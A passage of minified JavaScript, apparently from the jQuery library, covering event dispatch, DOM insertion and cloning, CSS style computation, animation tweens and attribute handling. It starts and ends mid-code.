RegExp("(^|\\.)"+h.join("\\.(?:.*\\.|)")+"(\\.|$)"),i=o=u.length;o--;)p=u[o],!r&&g!==p.origType||t&&t.guid!==p.guid||s&&!s.test(p.namespace)||a&&a!==p.selector&&("**"!==a||!p.selector)||(u.splice(o,1),p.selector&&u.delegateCount--,d.remove&&d.remove.call(n,p));i&&!u.length&&(d.teardown&&!1!==d.teardown.call(n,h,f.handle)||C.removeEvent(n,m,f.handle),delete l[m])}else for(m in l)C.event.remove(n,m+e[c],t,a,!0);C.isEmptyObject(l)&&sn.remove(n,"handle events")}},dispatch:function(n){var e,t,a,r,o,i,s=new Array(arguments.length),l=C.event.fix(n),c=(sn.get(this,"events")||Object.create(null))[l.type]||[],p=C.event.special[l.type]||{};for(s[0]=l,e=1;e<arguments.length;e++)s[e]=arguments[e];if(l.delegateTarget=this,!p.preDispatch||!1!==p.preDispatch.call(this,l)){for(i=C.event.handlers.call(this,l,c),e=0;(r=i[e++])&&!l.isPropagationStopped();)for(l.currentTarget=r.elem,t=0;(o=r.handlers[t++])&&!l.isImmediatePropagationStopped();)l.rnamespace&&!1!==o.namespace&&!l.rnamespace.test(o.namespace)||(l.handleObj=o,l.data=o.data,void 0!==(a=((C.event.special[o.origType]||{}).handle||o.handler).apply(r.elem,s))&&!1===(l.result=a)&&(l.preventDefault(),l.stopPropagation()));return p.postDispatch&&p.postDispatch.call(this,l),l.result}},handlers:function(n,e){var t,a,r,o,i,s=[],l=e.delegateCount,c=n.target;if(l&&c.nodeType&&!("click"===n.type&&n.button>=1))for(;c!==this;c=c.parentNode||this)if(1===c.nodeType&&("click"!==n.type||!0!==c.disabled)){for(o=[],i={},t=0;t<l;t++)void 0===i[r=(a=e[t]).selector+" "]&&(i[r]=a.needsContext?C(r,this).index(c)>-1:C.find(r,this,null,[c]).length),i[r]&&o.push(a);o.length&&s.push({elem:c,handlers:o})}return c=this,l<e.length&&s.push({elem:c,handlers:e.slice(l)}),s},addProp:function(n,e){Object.defineProperty(C.Event.prototype,n,{enumerable:!0,configurable:!0,get:b(e)?function(){if(this.originalEvent)return e(this.originalEvent)}:function(){if(this.originalEvent)return this.originalEvent[n]},set:function(e){Object.defineProperty(this,n,{enumerable:!0,configurable:!0,writable:!0,value:e})}})},fix:function(n){return n[C.expando]?n:new C.Event(n)},special:{load:{noBubble:!0},click:{setup:function(n){var e=this||n;return Tn.test(e.type)&&e.click&&j(e,"input")&&Ln(e,"click",!0),!1},trigger:function(n){var e=this||n;return Tn.test(e.type)&&e.click&&j(e,"input")&&Ln(e,"click"),!0},_default:function(n){var e=n.target;return Tn.test(e.type)&&e.click&&j(e,"input")&&sn.get(e,"click")||j(e,"a")}},beforeunload:{postDispatch:function(n){void 0!==n.result&&n.originalEvent&&(n.originalEvent.returnValue=n.result)}}}},C.removeEvent=function(n,e,t){n.removeEventListener&&n.removeEventListener(e,t)},C.Event=function(n,e){if(!(this instanceof C.Event))return new C.Event(n,e);n&&n.type?(this.originalEvent=n,this.type=n.type,this.isDefaultPrevented=n.defaultPrevented||void 0===n.defaultPrevented&&!1===n.returnValue?Dn:Fn,this.target=n.target&&3===n.target.nodeType?n.target.parentNode:n.target,this.currentTarget=n.currentTarget,this.relatedTarget=n.relatedTarget):this.type=n,e&&C.extend(this,e),this.timeStamp=n&&n.timeStamp||Date.now(),this[C.expando]=!0},C.Event.prototype={constructor:C.Event,isDefaultPrevented:Fn,isPropagationStopped:Fn,isImmediatePropagationStopped:Fn,isSimulated:!1,preventDefault:function(){var n=this.originalEvent;this.isDefaultPrevented=Dn,n&&!this.isSimulated&&n.preventDefault()},stopPropagation:function(){var n=this.originalEvent;this.isPropagationStopped=Dn,n&&!this.isSimulated&&n.stopPropagation()},stopImmediatePropagation:function(){var n=this.originalEvent;this.isImmediatePropagationStopped=Dn,n&&!this.isSimulated&&n.stopImmediatePropagation(),this.stopPropagation()}},C.each({altKey:!0,bubbles:!0,cancelable:!0,changedTouches:!0,ctrlKey:!0,detail:!0,eventPhase:!0,metaKey:!0,pageX:!0,pageY:!0,shiftKey:!0,view:!0,char:!0,code:!0,charCode:!0,key:!0,keyCode:!0,button:!0,buttons:!0,clientX:!0,clientY:!0,offsetX:!0,offsetY:!0,pointerId:!0,pointerType:!0,screenX:!0,screenY:!0,targetTouches:!0,toElement:!0,touches:!0,which:!0},C.event.addProp),C.each({focus:"focusin",blur:"focusout"},(function(n,e){function t(n){if(y.documentMode){var t=sn.get(this,"handle"),a=C.event.fix(n);a.type="focusin"===n.type?"focus":"blur",a.isSimulated=!0,t(n),a.target===a.currentTarget&&t(a)}else C.event.simulate(e,n.target,C.event.fix(n))}C.event.special[n]={setup:function(){var a;if(Ln(this,n,!0),!y.documentMode)return!1;(a=sn.get(this,e))||this.addEventListener(e,t),sn.set(this,e,(a||0)+1)},trigger:function(){return Ln(this,n),!0},teardown:function(){var n;if(!y.documentMode)return!1;(n=sn.get(this,e)-1)?sn.set(this,e,n):(this.removeEventListener(e,t),sn.remove(this,e))},_default:function(e){return sn.get(e.target,n)},delegateType:e},C.event.special[e]={setup:function(){var a=this.ownerDocument||this.document||this,r=y.documentMode?this:a,o=sn.get(r,e);o||(y.documentMode?this.addEventListener(e,t):a.addEventListener(n,t,!0)),sn.set(r,e,(o||0)+1)},teardown:function(){var a=this.ownerDocument||this.document||this,r=y.documentMode?this:a,o=sn.get(r,e)-1;o?sn.set(r,e,o):(y.documentMode?this.removeEventListener(e,t):a.removeEventListener(n,t,!0),sn.remove(r,e))}}})),C.each({mouseenter:"mouseover",mouseleave:"mouseout",pointerenter:"pointerover",pointerleave:"pointerout"},(function(n,e){C.event.special[n]={delegateType:e,bindType:e,handle:function(n){var t,a=this,r=n.relatedTarget,o=n.handleObj;return r&&(r===a||C.contains(a,r))||(n.type=o.origType,t=o.handler.apply(this,arguments),n.type=e),t}}})),C.fn.extend({on:function(n,e,t,a){return On(this,n,e,t,a)},one:function(n,e,t,a){return On(this,n,e,t,a,1)},off:function(n,e,t){var a,r;if(n&&n.preventDefault&&n.handleObj)return a=n.handleObj,C(n.delegateTarget).off(a.namespace?a.origType+"."+a.namespace:a.origType,a.selector,a.handler),this;if("object"==typeof n){for(r in n)this.off(r,e,n[r]);return this}return!1!==e&&"function"!=typeof e||(t=e,e=void 0),!1===t&&(t=Fn),this.each((function(){C.event.remove(this,n,t,e)}))}});var Mn=/<script|<style|<link/i,Nn=/checked\s*(?:[^=]|=\s*.checked.)/i,Rn=/^\s*<!\[CDATA\[|\]\]>\s*$/g;function qn(n,e){return j(n,"table")&&j(11!==e.nodeType?e:e.firstChild,"tr")&&C(n).children("tbody")[0]||n}function Un(n){return n.type=(null!==n.getAttribute("type"))+"/"+n.type,n}function $n(n){return"true/"===(n.type||"").slice(0,5)?n.type=n.type.slice(5):n.removeAttribute("type"),n}function Wn(n,e){var t,a,r,o,i,s;if(1===e.nodeType){if(sn.hasData(n)&&(s=sn.get(n).events))for(r in sn.remove(e,"handle events"),s)for(t=0,a=s[r].length;t<a;t++)C.event.add(e,r,s[r][t]);ln.hasData(n)&&(o=ln.access(n),i=C.extend({},o),ln.set(e,i))}}function Hn(n,e){var t=e.nodeName.toLowerCase();"input"===t&&Tn.test(n.type)?e.checked=n.checked:"input"!==t&&"textarea"!==t||(e.defaultValue=n.defaultValue)}function Vn(n,e,t,a){e=l(e);var r,o,i,s,c,p,d=0,u=n.length,m=u-1,h=e[0],g=b(h);if(g||u>1&&"string"==typeof h&&!f.checkClone&&Nn.test(h))return n.each((function(r){var o=n.eq(r);g&&(e[0]=h.call(this,r,o.html())),Vn(o,e,t,a)}));if(u&&(o=(r=In(e,n[0].ownerDocument,!1,n,a)).firstChild,1===r.childNodes.length&&(r=o),o||a)){for(s=(i=C.map(En(r,"script"),Un)).length;d<u;d++)c=r,d!==m&&(c=C.clone(c,!0,!0),s&&C.merge(i,En(c,"script"))),t.call(n[d],c,d);if(s)for(p=i[i.length-1].ownerDocument,C.map(i,$n),d=0;d<s;d++)c=i[d],Pn.test(c.type||"")&&!sn.access(c,"globalEval")&&C.contains(p,c)&&(c.src&&"module"!==(c.type||"").toLowerCase()?C._evalUrl&&!c.noModule&&C._evalUrl(c.src,{nonce:c.nonce||c.getAttribute("nonce")},p):w(c.textContent.replace(Rn,""),c,p))}return n}function Jn(n,e,t){for(var a,r=e?C.filter(e,n):n,o=0;null!=(a=r[o]);o++)t||1!==a.nodeType||C.cleanData(En(a)),a.parentNode&&(t&&fn(a)&&_n(En(a,"script")),a.parentNode.removeChild(a));return n}C.extend({htmlPrefilter:function(n){return n},clone:function(n,e,t){var a,r,o,i,s=n.cloneNode(!0),l=fn(n);if(!(f.noCloneChecked||1!==n.nodeType&&11!==n.nodeType||C.isXMLDoc(n)))for(i=En(s),a=0,r=(o=En(n)).length;a<r;a++)Hn(o[a],i[a]);if(e)if(t)for(o=o||En(n),i=i||En(s),a=0,r=o.length;a<r;a++)Wn(o[a],i[a]);else Wn(n,s);return(i=En(s,"script")).length>0&&_n(i,!l&&En(n,"script")),s},cleanData:function(n){for(var e,t,a,r=C.event.special,o=0;void 0!==(t=n[o]);o++)if(rn(t)){if(e=t[sn.expando]){if(e.events)for(a in e.events)r[a]?C.event.remove(t,a):C.removeEvent(t,a,e.handle);t[sn.expando]=void 0}t[ln.expando]&&(t[ln.expando]=void 0)}}}),C.fn.extend({detach:function(n){return Jn(this,n,!0)},remove:function(n){return Jn(this,n)},text:function(n){return Y(this,(function(n){return void 0===n?C.text(this):this.empty().each((function(){1!==this.nodeType&&11!==this.nodeType&&9!==this.nodeType||(this.textContent=n)}))}),null,n,arguments.length)},append:function(){return Vn(this,arguments,(function(n){1!==this.nodeType&&11!==this.nodeType&&9!==this.nodeType||qn(this,n).appendChild(n)}))},prepend:function(){return Vn(this,arguments,(function(n){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var e=qn(this,n);e.insertBefore(n,e.firstChild)}}))},before:function(){return Vn(this,arguments,(function(n){this.parentNode&&this.parentNode.insertBefore(n,this)}))},after:function(){return Vn(this,arguments,(function(n){this.parentNode&&this.parentNode.insertBefore(n,this.nextSibling)}))},empty:function(){for(var n,e=0;null!=(n=this[e]);e++)1===n.nodeType&&(C.cleanData(En(n,!1)),n.textContent="");return this},clone:function(n,e){return n=null!=n&&n,e=null==e?n:e,this.map((function(){return C.clone(this,n,e)}))},html:function(n){return Y(this,(function(n){var e=this[0]||{},t=0,a=this.length;if(void 0===n&&1===e.nodeType)return e.innerHTML;if("string"==typeof n&&!Mn.test(n)&&!An[(jn.exec(n)||["",""])[1].toLowerCase()]){n=C.htmlPrefilter(n);try{for(;t<a;t++)1===(e=this[t]||{}).nodeType&&(C.cleanData(En(e,!1)),e.innerHTML=n);e=0}catch(n){}}e&&this.empty().append(n)}),null,n,arguments.length)},replaceWith:function(){var n=[];return Vn(this,arguments,(function(e){var t=this.parentNode;C.inArray(this,n)<0&&(C.cleanData(En(this)),t&&t.replaceChild(e,this))}),n)}}),C.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},(function(n,e){C.fn[n]=function(n){for(var t,a=[],r=C(n),o=r.length-1,i=0;i<=o;i++)t=i===o?this:this.clone(!0),C(r[i])[e](t),c.apply(a,t.get());return this.pushStack(a)}}));var Qn=new RegExp("^("+un+")(?!px)[a-z%]+$","i"),Gn=/^--/,Xn=function(n){var e=n.ownerDocument.defaultView;return e&&e.opener||(e=t),e.getComputedStyle(n)},Kn=function(n,e,t){var a,r,o={};for(r in e)o[r]=n.style[r],n.style[r]=e[r];for(r in a=t.call(n),e)n.style[r]=o[r];return a},Zn=new RegExp(hn.join("|"),"i");function Yn(n,e,t){var a,r,o,i,s=Gn.test(e),l=n.style;return(t=t||Xn(n))&&(i=t.getPropertyValue(e)||t[e],s&&i&&(i=i.replace(B,"$1")||void 0),""!==i||fn(n)||(i=C.style(n,e)),!f.pixelBoxStyles()&&Qn.test(i)&&Zn.test(e)&&(a=l.width,r=l.minWidth,o=l.maxWidth,l.minWidth=l.maxWidth=l.width=i,i=t.width,l.width=a,l.minWidth=r,l.maxWidth=o)),void 0!==i?i+"":i}function ne(n,e){return{get:function(){if(!n())return(this.get=e).apply(this,arguments);delete this.get}}}!function(){function n(){if(p){c.style.cssText="position:absolute;left:-11111px;width:60px;margin-top:1px;padding:0;border:0",p.style.cssText="position:relative;display:block;box-sizing:border-box;overflow:scroll;margin:auto;border:1px;padding:1px;width:60%;top:1%",gn.appendChild(c).appendChild(p);var n=t.getComputedStyle(p);a="1%"!==n.top,l=12===e(n.marginLeft),p.style.right="60%",i=36===e(n.right),r=36===e(n.width),p.style.position="absolute",o=12===e(p.offsetWidth/3),gn.removeChild(c),p=null}}function e(n){return Math.round(parseFloat(n))}var a,r,o,i,s,l,c=y.createElement("div"),p=y.createElement("div");p.style&&(p.style.backgroundClip="content-box",p.cloneNode(!0).style.backgroundClip="",f.clearCloneStyle="content-box"===p.style.backgroundClip,C.extend(f,{boxSizingReliable:function(){return n(),r},pixelBoxStyles:function(){return n(),i},pixelPosition:function(){return n(),a},reliableMarginLeft:function(){return n(),l},scrollboxSize:function(){return n(),o},reliableTrDimensions:function(){var n,e,a,r;return null==s&&(n=y.createElement("table"),e=y.createElement("tr"),a=y.createElement("div"),n.style.cssText="position:absolute;left:-11111px;border-collapse:separate",e.style.cssText="box-sizing:content-box;border:1px solid",e.style.height="1px",a.style.height="9px",a.style.display="block",gn.appendChild(n).appendChild(e).appendChild(a),r=t.getComputedStyle(e),s=parseInt(r.height,10)+parseInt(r.borderTopWidth,10)+parseInt(r.borderBottomWidth,10)===e.offsetHeight,gn.removeChild(n)),s}}))}();var ee=["Webkit","Moz","ms"],te=y.createElement("div").style,ae={};function re(n){var e=C.cssProps[n]||ae[n];return e||(n in te?n:ae[n]=function(n){for(var e=n[0].toUpperCase()+n.slice(1),t=ee.length;t--;)if((n=ee[t]+e)in te)return n}(n)||n)}var oe=/^(none|table(?!-c[ea]).+)/,ie={position:"absolute",visibility:"hidden",display:"block"},se={letterSpacing:"0",fontWeight:"400"};function le(n,e,t){var a=mn.exec(e);return a?Math.max(0,a[2]-(t||0))+(a[3]||"px"):e}function ce(n,e,t,a,r,o){var i="width"===e?1:0,s=0,l=0,c=0;if(t===(a?"border":"content"))return 0;for(;i<4;i+=2)"margin"===t&&(c+=C.css(n,t+hn[i],!0,r)),a?("content"===t&&(l-=C.css(n,"padding"+hn[i],!0,r)),"margin"!==t&&(l-=C.css(n,"border"+hn[i]+"Width",!0,r))):(l+=C.css(n,"padding"+hn[i],!0,r),"padding"!==t?l+=C.css(n,"border"+hn[i]+"Width",!0,r):s+=C.css(n,"border"+hn[i]+"Width",!0,r));return!a&&o>=0&&(l+=Math.max(0,Math.ceil(n["offset"+e[0].toUpperCase()+e.slice(1)]-o-l-s-.5))||0),l+c}function pe(n,e,t){var a=Xn(n),r=(!f.boxSizingReliable()||t)&&"border-box"===C.css(n,"boxSizing",!1,a),o=r,i=Yn(n,e,a),s="offset"+e[0].toUpperCase()+e.slice(1);if(Qn.test(i)){if(!t)return i;i="auto"}return(!f.boxSizingReliable()&&r||!f.reliableTrDimensions()&&j(n,"tr")||"auto"===i||!parseFloat(i)&&"inline"===C.css(n,"display",!1,a))&&n.getClientRects().length&&(r="border-box"===C.css(n,"boxSizing",!1,a),(o=s in n)&&(i=n[s])),(i=parseFloat(i)||0)+ce(n,e,t||(r?"border":"content"),o,a,i)+"px"}function de(n,e,t,a,r){return new de.prototype.init(n,e,t,a,r)}C.extend({cssHooks:{opacity:{get:function(n,e){if(e){var t=Yn(n,"opacity");return""===t?"1":t}}}},cssNumber:{animationIterationCount:!0,aspectRatio:!0,borderImageSlice:!0,columnCount:!0,flexGrow:!0,flexShrink:!0,fontWeight:!0,gridArea:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnStart:!0,gridRow:!0,gridRowEnd:!0,gridRowStart:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,scale:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeMiterlimit:!0,strokeOpacity:!0},cssProps:{},style:function(n,e,t,a){if(n&&3!==n.nodeType&&8!==n.nodeType&&n.style){var r,o,i,s=an(e),l=Gn.test(e),c=n.style;if(l||(e=re(s)),i=C.cssHooks[e]||C.cssHooks[s],void 0===t)return i&&"get"in i&&void 0!==(r=i.get(n,!1,a))?r:c[e];"string"===(o=typeof t)&&(r=mn.exec(t))&&r[1]&&(t=yn(n,e,r),o="number"),null!=t&&t==t&&("number"!==o||l||(t+=r&&r[3]||(C.cssNumber[s]?"":"px")),f.clearCloneStyle||""!==t||0!==e.indexOf("background")||(c[e]="inherit"),i&&"set"in i&&void 0===(t=i.set(n,t,a))||(l?c.setProperty(e,t):c[e]=t))}},css:function(n,e,t,a){var r,o,i,s=an(e);return Gn.test(e)||(e=re(s)),(i=C.cssHooks[e]||C.cssHooks[s])&&"get"in i&&(r=i.get(n,!0,t)),void 0===r&&(r=Yn(n,e,a)),"normal"===r&&e in se&&(r=se[e]),""===t||t?(o=parseFloat(r),!0===t||isFinite(o)?o||0:r):r}}),C.each(["height","width"],(function(n,e){C.cssHooks[e]={get:function(n,t,a){if(t)return!oe.test(C.css(n,"display"))||n.getClientRects().length&&n.getBoundingClientRect().width?pe(n,e,a):Kn(n,ie,(function(){return pe(n,e,a)}))},set:function(n,t,a){var r,o=Xn(n),i=!f.scrollboxSize()&&"absolute"===o.position,s=(i||a)&&"border-box"===C.css(n,"boxSizing",!1,o),l=a?ce(n,e,a,s,o):0;return s&&i&&(l-=Math.ceil(n["offset"+e[0].toUpperCase()+e.slice(1)]-parseFloat(o[e])-ce(n,e,"border",!1,o)-.5)),l&&(r=mn.exec(t))&&"px"!==(r[3]||"px")&&(n.style[e]=t,t=C.css(n,e)),le(0,t,l)}}})),C.cssHooks.marginLeft=ne(f.reliableMarginLeft,(function(n,e){if(e)return(parseFloat(Yn(n,"marginLeft"))||n.getBoundingClientRect().left-Kn(n,{marginLeft:0},(function(){return n.getBoundingClientRect().left})))+"px"})),C.each({margin:"",padding:"",border:"Width"},(function(n,e){C.cssHooks[n+e]={expand:function(t){for(var a=0,r={},o="string"==typeof t?t.split(" "):[t];a<4;a++)r[n+hn[a]+e]=o[a]||o[a-2]||o[0];return r}},"margin"!==n&&(C.cssHooks[n+e].set=le)})),C.fn.extend({css:function(n,e){return Y(this,(function(n,e,t){var a,r,o={},i=0;if(Array.isArray(e)){for(a=Xn(n),r=e.length;i<r;i++)o[e[i]]=C.css(n,e[i],!1,a);return o}return void 0!==t?C.style(n,e,t):C.css(n,e)}),n,e,arguments.length>1)}}),C.Tween=de,de.prototype={constructor:de,init:function(n,e,t,a,r,o){this.elem=n,this.prop=t,this.easing=r||C.easing._default,this.options=e,this.start=this.now=this.cur(),this.end=a,this.unit=o||(C.cssNumber[t]?"":"px")},cur:function(){var n=de.propHooks[this.prop];return n&&n.get?n.get(this):de.propHooks._default.get(this)},run:function(n){var e,t=de.propHooks[this.prop];return this.options.duration?this.pos=e=C.easing[this.easing](n,this.options.duration*n,0,1,this.options.duration):this.pos=e=n,this.now=(this.end-this.start)*e+this.start,this.options.step&&this.options.step.call(this.elem,this.now,this),t&&t.set?t.set(this):de.propHooks._default.set(this),this}},de.prototype.init.prototype=de.prototype,de.propHooks={_default:{get:function(n){var e;return 1!==n.elem.nodeType||null!=n.elem[n.prop]&&null==n.elem.style[n.prop]?n.elem[n.prop]:(e=C.css(n.elem,n.prop,""))&&"auto"!==e?e:0},set:function(n){C.fx.step[n.prop]?C.fx.step[n.prop](n):1!==n.elem.nodeType||!C.cssHooks[n.prop]&&null==n.elem.style[re(n.prop)]?n.elem[n.prop]=n.now:C.style(n.elem,n.prop,n.now+n.unit)}}},de.propHooks.scrollTop=de.propHooks.scrollLeft={set:function(n){n.elem.nodeType&&n.elem.parentNode&&(n.elem[n.prop]=n.now)}},C.easing={linear:function(n){return n},swing:function(n){return.5-Math.cos(n*Math.PI)/2},_default:"swing"},C.fx=de.prototype.init,C.fx.step={};var ue,me,he=/^(?:toggle|show|hide)$/,ge=/queueHooks$/;function fe(){me&&(!1===y.hidden&&t.requestAnimationFrame?t.requestAnimationFrame(fe):t.setTimeout(fe,C.fx.interval),C.fx.tick())}function be(){return t.setTimeout((function(){ue=void 0})),ue=Date.now()}function ve(n,e){var t,a=0,r={height:n};for(e=e?1:0;a<4;a+=2-e)r["margin"+(t=hn[a])]=r["padding"+t]=n;return e&&(r.opacity=r.width=n),r}function ye(n,e,t){for(var a,r=(xe.tweeners[e]||[]).concat(xe.tweeners["*"]),o=0,i=r.length;o<i;o++)if(a=r[o].call(t,e,n))return a}function xe(n,e,t){var a,r,o=0,i=xe.prefilters.length,s=C.Deferred().always((function(){delete l.elem})),l=function(){if(r)return!1;for(var e=ue||be(),t=Math.max(0,c.startTime+c.duration-e),a=1-(t/c.duration||0),o=0,i=c.tweens.length;o<i;o++)c.tweens[o].run(a);return s.notifyWith(n,[c,a,t]),a<1&&i?t:(i||s.notifyWith(n,[c,1,0]),s.resolveWith(n,[c]),!1)},c=s.promise({elem:n,props:C.extend({},e),opts:C.extend(!0,{specialEasing:{},easing:C.easing._default},t),originalProperties:e,originalOptions:t,startTime:ue||be(),duration:t.duration,tweens:[],createTween:function(e,t){var a=C.Tween(n,c.opts,e,t,c.opts.specialEasing[e]||c.opts.easing);return c.tweens.push(a),a},stop:function(e){var t=0,a=e?c.tweens.length:0;if(r)return this;for(r=!0;t<a;t++)c.tweens[t].run(1);return e?(s.notifyWith(n,[c,1,0]),s.resolveWith(n,[c,e])):s.rejectWith(n,[c,e]),this}}),p=c.props;for(!function(n,e){var t,a,r,o,i;for(t in n)if(r=e[a=an(t)],o=n[t],Array.isArray(o)&&(r=o[1],o=n[t]=o[0]),t!==a&&(n[a]=o,delete n[t]),(i=C.cssHooks[a])&&"expand"in i)for(t in o=i.expand(o),delete n[a],o)t in n||(n[t]=o[t],e[t]=r);else e[a]=r}(p,c.opts.specialEasing);o<i;o++)if(a=xe.prefilters[o].call(c,n,p,c.opts))return b(a.stop)&&(C._queueHooks(c.elem,c.opts.queue).stop=a.stop.bind(a)),a;return C.map(p,ye,c),b(c.opts.start)&&c.opts.start.call(n,c),c.progress(c.opts.progress).done(c.opts.done,c.opts.complete).fail(c.opts.fail).always(c.opts.always),C.fx.timer(C.extend(l,{elem:n,anim:c,queue:c.opts.queue})),c}C.Animation=C.extend(xe,{tweeners:{"*":[function(n,e){var t=this.createTween(n,e);return yn(t.elem,n,mn.exec(e),t),t}]},tweener:function(n,e){b(n)?(e=n,n=["*"]):n=n.match(V);for(var t,a=0,r=n.length;a<r;a++)t=n[a],xe.tweeners[t]=xe.tweeners[t]||[],xe.tweeners[t].unshift(e)},prefilters:[function(n,e,t){var a,r,o,i,s,l,c,p,d="width"in e||"height"in e,u=this,m={},h=n.style,g=n.nodeType&&vn(n),f=sn.get(n,"fxshow");for(a in t.queue||(null==(i=C._queueHooks(n,"fx")).unqueued&&(i.unqueued=0,s=i.empty.fire,i.empty.fire=function(){i.unqueued||s()}),i.unqueued++,u.always((function(){u.always((function(){i.unqueued--,C.queue(n,"fx").length||i.empty.fire()}))}))),e)if(r=e[a],he.test(r)){if(delete e[a],o=o||"toggle"===r,r===(g?"hide":"show")){if("show"!==r||!f||void 0===f[a])continue;g=!0}m[a]=f&&f[a]||C.style(n,a)}if((l=!C.isEmptyObject(e))||!C.isEmptyObject(m))for(a in d&&1===n.nodeType&&(t.overflow=[h.overflow,h.overflowX,h.overflowY],null==(c=f&&f.display)&&(c=sn.get(n,"display")),"none"===(p=C.css(n,"display"))&&(c?p=c:(kn([n],!0),c=n.style.display||c,p=C.css(n,"display"),kn([n]))),("inline"===p||"inline-block"===p&&null!=c)&&"none"===C.css(n,"float")&&(l||(u.done((function(){h.display=c})),null==c&&(p=h.display,c="none"===p?"":p)),h.display="inline-block")),t.overflow&&(h.overflow="hidden",u.always((function(){h.overflow=t.overflow[0],h.overflowX=t.overflow[1],h.overflowY=t.overflow[2]}))),l=!1,m)l||(f?"hidden"in f&&(g=f.hidden):f=sn.access(n,"fxshow",{display:c}),o&&(f.hidden=!g),g&&kn([n],!0),u.done((function(){for(a in g||kn([n]),sn.remove(n,"fxshow"),m)C.style(n,a,m[a])}))),l=ye(g?f[a]:0,a,u),a in f||(f[a]=l.start,g&&(l.end=l.start,l.start=0))}],prefilter:function(n,e){e?xe.prefilters.unshift(n):xe.prefilters.push(n)}}),C.speed=function(n,e,t){var a=n&&"object"==typeof n?C.extend({},n):{complete:t||!t&&e||b(n)&&n,duration:n,easing:t&&e||e&&!b(e)&&e};return C.fx.off?a.duration=0:"number"!=typeof a.duration&&(a.duration in C.fx.speeds?a.duration=C.fx.speeds[a.duration]:a.duration=C.fx.speeds._default),null!=a.queue&&!0!==a.queue||(a.queue="fx"),a.old=a.complete,a.complete=function(){b(a.old)&&a.old.call(this),a.queue&&C.dequeue(this,a.queue)},a},C.fn.extend({fadeTo:function(n,e,t,a){return this.filter(vn).css("opacity",0).show().end().animate({opacity:e},n,t,a)},animate:function(n,e,t,a){var r=C.isEmptyObject(n),o=C.speed(e,t,a),i=function(){var e=xe(this,C.extend({},n),o);(r||sn.get(this,"finish"))&&e.stop(!0)};return i.finish=i,r||!1===o.queue?this.each(i):this.queue(o.queue,i)},stop:function(n,e,t){var a=function(n){var e=n.stop;delete n.stop,e(t)};return"string"!=typeof n&&(t=e,e=n,n=void 0),e&&this.queue(n||"fx",[]),this.each((function(){var e=!0,r=null!=n&&n+"queueHooks",o=C.timers,i=sn.get(this);if(r)i[r]&&i[r].stop&&a(i[r]);else for(r in i)i[r]&&i[r].stop&&ge.test(r)&&a(i[r]);for(r=o.length;r--;)o[r].elem!==this||null!=n&&o[r].queue!==n||(o[r].anim.stop(t),e=!1,o.splice(r,1));!e&&t||C.dequeue(this,n)}))},finish:function(n){return!1!==n&&(n=n||"fx"),this.each((function(){var e,t=sn.get(this),a=t[n+"queue"],r=t[n+"queueHooks"],o=C.timers,i=a?a.length:0;for(t.finish=!0,C.queue(this,n,[]),r&&r.stop&&r.stop.call(this,!0),e=o.length;e--;)o[e].elem===this&&o[e].queue===n&&(o[e].anim.stop(!0),o.splice(e,1));for(e=0;e<i;e++)a[e]&&a[e].finish&&a[e].finish.call(this);delete t.finish}))}}),C.each(["toggle","show","hide"],(function(n,e){var t=C.fn[e];C.fn[e]=function(n,a,r){return null==n||"boolean"==typeof n?t.apply(this,arguments):this.animate(ve(e,!0),n,a,r)}})),C.each({slideDown:ve("show"),slideUp:ve("hide"),slideToggle:ve("toggle"),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"},fadeToggle:{opacity:"toggle"}},(function(n,e){C.fn[n]=function(n,t,a){return this.animate(e,n,t,a)}})),C.timers=[],C.fx.tick=function(){var n,e=0,t=C.timers;for(ue=Date.now();e<t.length;e++)(n=t[e])()||t[e]!==n||t.splice(e--,1);t.length||C.fx.stop(),ue=void 0},C.fx.timer=function(n){C.timers.push(n),C.fx.start()},C.fx.interval=13,C.fx.start=function(){me||(me=!0,fe())},C.fx.stop=function(){me=null},C.fx.speeds={slow:600,fast:200,_default:400},C.fn.delay=function(n,e){return n=C.fx&&C.fx.speeds[n]||n,e=e||"fx",this.queue(e,(function(e,a){var r=t.setTimeout(e,n);a.stop=function(){t.clearTimeout(r)}}))},function(){var n=y.createElement("input"),e=y.createElement("select").appendChild(y.createElement("option"));n.type="checkbox",f.checkOn=""!==n.value,f.optSelected=e.selected,(n=y.createElement("input")).value="t",n.type="radio",f.radioValue="t"===n.value}();var we,ke=C.expr.attrHandle;C.fn.extend({attr:function(n,e){return Y(this,C.attr,n,e,arguments.length>1)},removeAttr:function(n){return this.each((function(){C.removeAttr(this,n)}))}}),C.extend({attr:function(n,e,t){var a,r,o=n.nodeType;if(3!==o&&8!==o&&2!==o)return void 0===n.getAttribute?C.prop(n,e,t):(1===o&&C.isXMLDoc(n)||(r=C.attrHooks[e.toLowerCase()]||(C.expr.match.bool.test(e)?we:void 0)),void 0!==t?null===t?void C.removeAttr(n,e):r&&"set"in r&&void 0!==(a=r.set(n,t,e))?a:(n.setAttribute(e,t+""),t):r&&"get"in r&&null!==(a=r.get(n,e))?a:null==(a=C.find.attr(n,e))?void 0:a)},attrHooks:{type:{set:function(n,e){if(!f.radioValue&&"radio"===e&&j(n,"input")){var t=n.value;return n.setAttribute("type",e),t&&(n.value=t),e}}}},removeAttr:function(n,e){var t,a=0,r=e&&e.match(V);if(r&&1===n.nodeType)for(;t=r[a++];)n.removeAttribute(t)}}),we={set:function(n,e,t){return!1===e?C.removeAttr(n,t):n.setAttribute(t,t),t}},C.each(C.expr.match.bool.source.match(/\w+/g),(function(n,e){var t=ke[e]||C.find.attr;ke[e]=function(n,e,a){var r,o,i=e.toLowerCase();return a||(o=ke[i],ke[i]=r,r=null!=t(n,e,a)?i:null,ke[i]=o),r}}));var Se=/^(?:input|select|textarea|button)$/i,Ce=/^(?:a|area)$/i;function Te(n){return(n.match(V)||[]).join(" ")}function je(n){return n.getAttribute&&n.getAttribute("class")||""}function Pe(n){return Array.isArray(n)?n:"string"==typeof n&&n.match(V)||[]}C.fn.extend({prop:function(n,e){return Y(this,C.prop,n,e,arguments.length>1)},removeProp:function(n){return this.each((function(){delete this[C.propFix[n]||n]}))}}),C.extend({prop:function(n,e,t){var a,r,o=n.nodeType;if(3!==o&&8!==o&&2!==o)return 1===o&&C.isXMLDoc(n)||(e=C.propFix[e]||e,r=C.propHooks[e]),void 0!==t?r&&"set"in r&&void 